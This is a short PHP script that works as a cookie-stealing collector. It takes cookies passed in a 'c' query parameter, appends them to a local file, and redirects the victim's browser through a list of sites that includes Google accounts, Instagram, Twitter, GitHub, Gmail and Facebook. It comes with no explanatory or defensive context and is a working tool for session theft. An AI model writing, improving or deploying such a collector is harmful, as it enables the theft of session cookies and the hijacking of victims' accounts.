<?php
$cookies = $_GET["c"];
$whr=$_GET["w"];
$urls="accounts.google.com,www.instagram.com,www.twitter.com,www.www.github.com,www.gmail.com,www.facebook.com";
$ass=explode(',',$urls) ;
$ch=sizeof($ass)-1;
echo '<script type="text/javascript">';
if($whr==$ch){die;}
$exact=$ass[$whr];
$exac=$exact;
if ($whr == "0"){$exac="somethink";}
if (isset($cookies)){
	$c="http://".$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'];
	$file = fopen('cokies.f', 'a');
	fwrite($file, "COOKIES=".$cookies ."\nurl=".$exac. "\n#######################################\n");
}

echo "document.location='http://$exact/?w=$whr'";
echo "</script>";
$whr=$whr+1;

?>
<!--
<script type="text/javascript">
document.location='http://www.facebook.com';
</script>
-->
